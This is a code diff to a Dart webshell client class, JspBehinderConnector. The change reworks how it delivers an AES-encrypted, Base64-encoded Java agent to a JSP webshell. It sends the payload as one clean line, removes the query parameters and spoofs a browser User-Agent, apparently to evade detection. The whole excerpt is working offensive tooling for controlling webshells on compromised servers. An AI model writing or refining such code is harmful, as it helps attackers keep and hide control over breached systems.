@@ -126,7 +126,6 @@ class JspBehinderConnector extends ShellConnector {
     return h;
   }
 
-  /// AES/ECB/PKCS5 加密（与 Java Cipher.getInstance("AES") 兼容）
   String _aesEncryptBase64(Uint8List plain) {
     final key = enc.Key(Uint8List.fromList(utf8.encode(_aesKey)));
     final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
@@ -166,16 +165,15 @@ class JspBehinderConnector extends ShellConnector {
       final agentBytes = await _getAgentBytes();
       if (agentBytes.isEmpty) return '[Error] jsp_agent_M.b64 未找到';
 
-      final line1 = _aesEncryptBase64(agentBytes);
-      final line2 = _buildParamLine(action, extraParams);
-      // bing.jsp 原版只读第一行；jsp_behinder 用 _bp。两行格式兼容两者，agent 从 _bl2/header/query 取参
-      // 使用 CRLF 兼容部分 servlet 实现
-      final bodyBytes = utf8.encode('$line1\r\n$line2');
+      // 发送纯净单行 Base64 载荷，不带换行符，防止 readLine() 意外截断
+      final b64Payload = _aesEncryptBase64(agentBytes).replaceAll('\n', '').replaceAll('\r', '');
+      final bodyBytes = utf8.encode(b64Payload);
 
-      var uri = Uri.parse(webshell.url);
-      final query = <String, String>{'a': action, ...extraParams};
-      uri = uri.replace(queryParameters: query);
+      final uri = Uri.parse(webshell.url);
       final headers = _requestHeaders(action, extraParams);
+      // 增加触发 Header 兼容性
+      headers['Accept'] = '*/*';
+      headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';
 
       final response = await _client
           .post(uri, headers: headers, body: bodyBytes)
